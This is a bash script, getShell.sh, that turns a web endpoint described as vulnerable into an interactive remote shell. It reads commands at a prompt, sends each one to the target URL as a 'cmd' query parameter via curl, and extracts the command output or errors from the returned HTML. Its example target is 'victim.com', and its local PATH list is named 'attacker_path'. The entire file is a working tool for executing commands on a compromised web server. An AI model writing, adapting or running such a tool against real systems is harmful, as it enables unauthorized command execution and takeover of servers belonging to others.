#!/bin/bash

#region colours
green=$(tput setaf 2; tput bold)
red=$(tput setaf 1; tput bold)
yellow=$(tput setaf 3; tput bold)
cyan=$(tput setaf 6; tput bold)
gray=$(tput setaf 7; tput bold)
purple=$(tput setaf 5; tput bold)
end=$(tput sgr0)
#endregion

#region Globals
declare -a local_path
declare -r attacker_path="/root/.local/bin:usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/sbin:/usr/local/games:/usr/games"
#endregion

#region signals
trap ctrl_c INT
function ctrl_c() {
    echo -e "\n${red}[-]${end} Exiting...\n"
    exit 0
}
#endregion

#region helpPanel
function helpPanel() {
	echo -e "\n${yellow}[+]${end} Help Panel\n"
	echo -e "Usage: ${green}./getShell.sh${end} ${cyan}[-h | --help]${end} ${yellow}[-u | --url]${end}"
	echo -e "Options:"
	echo -e "  ${cyan}-h | --help${end}     Show this help panel"
	echo -e "  ${cyan}-u | --url${end}      URL target endpoint vulnerable"
	echo -e "\nExample: ${green}./getShell.sh${end} ${cyan}-u${end} ${yellow}"
	echo -e "  ${cyan}-u | --url${end}      URL target endpoint vulnerable"
	echo -e "\nExample: ${green}./getShell.sh${end} ${cyan}-u${end} ${yellow}http://victim.com${end}"
	exit 0
}
#endregion

#region getShell
function makeRequest(){
	local this_url=$1
	local this_command=$2
	echo -e "${purple}"
	# Get the HTML
	local response=$(curl -s "${this_url}?cmd=${this_command}")
	echo -ne "${end}"
	# Check if there is output (green colour)
	if echo "$response" | grep -q 'rgb(13, 232, 60)'; then
		echo -e "${cyan}"
		echo "$response" | awk '
			/<pre[^>]*>/ {
				flag=1
				# remove everything up to > and show what follows
				sub(/^.*<pre[^>]*>/, "")
			}
			/<\/pre>/ {
				flag=0
				# remove everything from </pre> and continue
				sub(/<\/pre>.*/, "")
			}
			flag
		'
		echo -ne "${end}"
	# Check if there is an error (red colour)
	elif echo "$response" | grep -q 'rgb(240, 0, 0)'; then
		local error_msg=$(echo "$response" | sed -n 's/.*<pre style="color:rgb(240, 0, 0);">\(.*\)<\/pre>.*/\1/p' | sed 's/&lt;/</g' | sed 's/&gt;/>/g' | sed 's/&amp;/\&/g')
		echo "${red}[!] $error_msg${end}"
	else
		echo "${red}[!] Could not get response from server${end}"
	fi

	echo -ne "${end}"
}


function getShell(){
	local url=$1
	local command=""
	for path in $(echo $attacker_path | tr ":" "\n"); do
		if [ -d "$path" ]; then # Check if directory exists
			local_path+=("$path")
		fi
	done
	while [ "$command" != "exit" ]; do
		local_counter=0

		read -p "${gray}~\$${end} " command

		# Skip validation for empty commands
		if [ -z "$command" ]; then
			continue
		fi

		# Get the first word of the command (the command itself)
		cmd=$(echo "$command" | awk '{print $1}')
		# Special handling for cd command
		if [ "$cmd" == "cd" ]; then
			echo -e "${cyan} we have cd${end}"
			local_counter+=1
		else
			# Check if command exists in any of the paths
			for element in "${local_path[@]}"; do
				if [ -x "$element/$cmd" ]; then
					local_counter+=1
					break
				fi
			done
		fi

		if [ $local_counter -eq 1 ]; then
			command_encoded=$(echo -e "$command" | sed 's/ /\%20/g')
			makeRequest "$url" "$command_encoded"
		else
			echo -e "${red}[-]${end} Command ${cyan}$cmd${end} not found"
		fi
	done
	
}
#endregion

#region main
function main() {
	#region args
    declare -a args=("$@")
    declare -i args_counter=0
    url="" # Variable to store the url
    while [ $# -gt 0 ]; do
        case "$1" in # Check if the argument is an option
            -h|--help)
                helpPanel
                exit 0
            ;;
            -u|--url)
                shift
                url="$1"
            ;;
            *)
                echo "Unkown Option: $1"
				helpPanel
                exit 1
            ;;
        esac
        shift
    done
    if [ -z "$url" ]; then
        echo "There is no URL"
		helpPanel
        exit 1
    fi
    #endregion
    getShell "$url"

}
main "$@"
# endregion